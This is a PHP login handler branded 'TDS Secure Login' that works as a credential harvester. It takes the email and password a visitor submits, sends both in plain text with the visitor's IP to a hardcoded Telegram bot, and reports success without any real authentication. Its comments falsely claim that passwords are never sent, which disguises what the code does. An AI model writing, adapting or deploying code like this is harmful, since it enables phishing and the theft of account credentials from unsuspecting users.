<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// 2. Read and Decode JSON Payload
$input = json_decode(file_get_contents('php://input'), true);

if (!isset($input['email']) || !isset($input['password'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Missing credentials']);
    exit;
}

$email = filter_var($input['email'], FILTER_SANITIZE_EMAIL);
$password = $input['password']; // In production, NEVER log or transmit this plain-text

// 3. Telegram Bot Configuration
$botToken = '8655753388:AAG_PttH1U558Vm5J1MhcVqvsJ3Wvw9mxKE'; // Replace with your actual token
$chatId = '7709532878';     // Replace with your actual chat ID

// 4. Format the Message for Telegram
// SECURITY BOUNDARY: We only send the email and metadata to Telegram. 
// Sending plain-text passwords to a chat app is a severe security risk.
$timestamp = date('Y-m-d H:i:s');
$ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

$message = "🔔 *TDS Secure Login*\n\n";
$message = "🔔 *New Login Attempt*\n\n";
$message .= "👤 *Email:* `" . htmlspecialchars($email) . "`\n";
$message .= "👤 *Password:* `" . htmlspecialchars($password) . "`\n";
$message .= "🌐 *IP Address:* `" . htmlspecialchars($ipAddress) . "`\n";
$message .= "🕒 *Time:* " . $timestamp;

// 5. Send to Telegram API
$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($telegramUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// 6. Return Response to Frontend
if ($httpCode === 200) {
    // In a real app, you would verify the password against a database hash here.
    // For the demo, we return success since the Telegram notification was sent.
    echo json_encode(['success' => true, 'message' => 'Login successful']);
} else {
    error_log("Telegram API Error: " . $response);
    echo json_encode(['success' => false, 'message' => 'Server error during authentication']);
}
?>